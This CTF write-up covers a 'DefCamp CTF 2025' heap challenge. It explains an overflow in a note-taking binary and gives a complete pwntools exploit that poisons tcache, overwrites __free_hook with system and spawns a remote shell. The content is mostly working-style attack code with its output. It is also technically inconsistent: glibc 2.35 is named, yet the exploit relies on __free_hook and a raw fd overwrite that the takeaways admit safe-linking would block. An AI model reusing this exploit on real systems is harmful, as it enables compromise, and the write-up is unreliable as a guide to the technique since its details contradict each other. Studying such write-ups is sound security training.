+++
title = "Heap Overflow via Tcache Poisoning"
date = "2025-02-22"
description = "Tcache poisoning attack on a custom allocator to gain arbitrary write and redirect execution flow."
tags = ["heap", "pwn", "tcache", "glibc"]
categories = ["pwn"]
difficulty = "hard"
category = "Pwn"
points = "500"
ctf_name = "DefCamp CTF 2025"
challenge_author = "ptr_yolo"
solves = "12"
+++

## Challenge Description

A note-taking application compiled with glibc 2.35. The binary has PIE enabled, partial RELRO, and no canary. We need to get a shell on the remote server.

```
$ checksec note_keeper
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## Vulnerability Analysis

Reversing the binary in Ghidra reveals a heap buffer overflow in the `edit_note` function:

```c
void edit_note(int idx) {
    printf("New content: ");
    // Bug: reads 0x100 bytes regardless of original allocation size
    read(0, notes[idx]->content, 0x100);
}
```

Notes are allocated with `malloc(0x40)`, but the edit function reads up to `0x100` bytes, giving us a 192-byte overflow.

## Exploitation Strategy

1. Leak heap base via tcache metadata
2. Overflow into adjacent chunk to poison tcache free list
3. Allocate chunk overlapping `__free_hook`
4. Write `system` address to `__free_hook`
5. Free a chunk containing `/bin/sh`

## Exploit Development

### Step 1: Heap Layout Setup

```python
from pwn import *

elf = ELF("./note_keeper")
libc = ELF("./libc.so.6")
p = remote("pwn.defcamp.ro", 31337)

def add(size, content):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"Size: ", str(size).encode())
    p.sendafter(b"Content: ", content)

def edit(idx, content):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"Index: ", str(idx).encode())
    p.sendafter(b"Content: ", content)

def delete(idx):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"Index: ", str(idx).encode())

def show(idx):
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"Index: ", str(idx).encode())
    return p.recvuntil(b"\n", drop=True)
```

### Step 2: Leak libc Base

```python
# Fill tcache, force unsorted bin
for i in range(9):
    add(0x80, b"A" * 0x80)

for i in range(8, -1, -1):
    delete(i)

# Unsorted bin chunk has libc pointers
add(0x80, b"")  # idx 0, from unsorted bin
leak = u64(show(0).ljust(8, b"\x00"))
libc.address = leak - 0x1ecbe0
log.success(f"libc base: {hex(libc.address)}")
```

### Step 3: Tcache Poisoning

```python
add(0x30, b"B" * 0x30)  # idx 1
add(0x30, b"C" * 0x30)  # idx 2
add(0x30, b"/bin/sh\x00")  # idx 3

delete(2)
delete(1)

# Overflow from idx 1 into freed idx 2's fd pointer
target = libc.sym.__free_hook
payload = b"D" * 0x30           # fill idx 1
payload += p64(0)               # prev_size
payload += p64(0x41)            # size
payload += p64(target)          # poisoned fd
edit(1, payload)
```

### Step 4: Overwrite free_hook

```python
add(0x30, b"E" * 0x30)         # returns old idx 2
add(0x30, p64(libc.sym.system)) # returns __free_hook

# Trigger system("/bin/sh")
delete(3)

p.interactive()
```

## Result

```
$ python3 exploit.py REMOTE
[+] libc base: 0x7f3a2c000000
[*] Switching to interactive mode
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ cat /flag.txt
```

## Flag

<div class="flag-box">FLAG{tc4ch3_p01s0n_fr33_h00k_ftw}</div>

## Takeaways

- Tcache poisoning in glibc 2.35 requires bypassing the safe-linking mitigation on newer versions
- Partial RELRO leaves GOT writable but `__free_hook` is a cleaner target
- Always validate buffer sizes match allocation sizes
